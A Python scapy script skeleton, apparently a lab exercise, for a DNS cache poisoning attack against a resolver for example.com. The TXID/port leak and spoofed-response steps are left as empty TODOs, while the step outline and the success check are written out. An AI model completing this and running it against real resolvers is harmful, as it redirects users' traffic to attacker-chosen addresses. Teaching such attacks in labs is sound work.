import time
import socket
import struct

from scapy.all import *
from common_library import *


print("[*] 0. First query, just to get the resolver to cache the NS record for example.com...")
#TODO make a query for example.com to get the resolver to cache the NS record for example.com,
# this will make our attack more reliable,
# since the resolver will not need to query the authoritative server mid attack.

#END TODO
ans = sr1(dns_loader, timeout=10, verbose=0)
print(ans.show() if ans else "No answer received")


print("[*] 1. Leaking resolver TXID/port via controlled domain...")
#TODO leak the TXID and source port

#END TODO 
to_send =[]
#TODO build the trigger query and 20 spoofed responses, using the leaked TXID and port.
# Make sure to increment the TXID for each response, since the resolver will increment the TXID for each retry.
# insert the pprebuilt query in the to_send list.


#END TODO



print("[*] 2. Sending and spoofing responses.")
send(to_send, verbose=0)


print("[*] 3. Verifying if the cache is poisoned...")
test_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
ans = sr1(test_query, timeout=10, verbose=0)
print(ans.show() if ans else "No answer received")

if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")
